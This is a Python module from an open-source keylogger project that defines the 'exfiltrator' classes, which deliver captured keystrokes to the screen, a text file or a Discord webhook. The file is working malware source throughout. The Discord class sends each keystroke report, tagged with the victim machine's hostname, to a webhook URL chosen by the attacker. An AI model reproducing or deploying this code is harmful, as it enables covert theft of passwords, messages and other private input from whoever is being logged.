#!/usr/bin/env python3
# https://github.com/EONRaider/Keylogger

__author__ = "EONRaider @ keybase.io/eonraider"

import abc
import aiohttp
import asyncio
import platform
from datetime import datetime
from pathlib import Path

from discord import Webhook, AsyncWebhookAdapter

from keylogger import KeyLogger


class Exfiltrator(abc.ABC):
    def __init__(self, keylogger: KeyLogger, tag: str):
        self.keylogger = keylogger
        self.keylogger.register_exfiltrator(self)
        self.tag = tag if tag is not None else \
            f"{self.keylogger.__class__.__name__}::" \
            f"{self.__class__.__name__}::" \
            f"{platform.node()}"

    @property
    def report(self) -> str:
        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
        header = f"[{self.tag}] @ {timestamp}"
        if self.keylogger.has_data:
            return f"{header} - {self.keylogger.contents}"
        return f"{header} - <NO INPUT>"

    @abc.abstractmethod
    def update(self, *args, **kwargs):
        ...


class Screen(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None):
        super().__init__(keylogger, tag)

    def update(self) -> None:
        print(self.report)


class TextFile(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 file_path: [str, Path]):
        super().__init__(keylogger, tag)
        self.file_path = file_path

    def update(self) -> None:
        if self.keylogger.has_data:
            with open(file=self.file_path, mode="a", encoding="utf_8") as file:
                file.write(f"{self.report}\n")


class Discord(Exfiltrator):
    def __init__(self, *,
                 keylogger: KeyLogger,
                 tag: str = None,
                 webhook_url: str):
        super().__init__(keylogger, tag)
        self.webhook_url = webhook_url

    def update(self) -> None:
        if self.keylogger.has_data:
            asyncio.run(self.send_message())

    async def send_message(self) -> None:
        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(url=self.webhook_url,
                                       adapter=AsyncWebhookAdapter(session))
            await webhook.send(content=self.report,
                               username=self.keylogger.__class__.__name__)
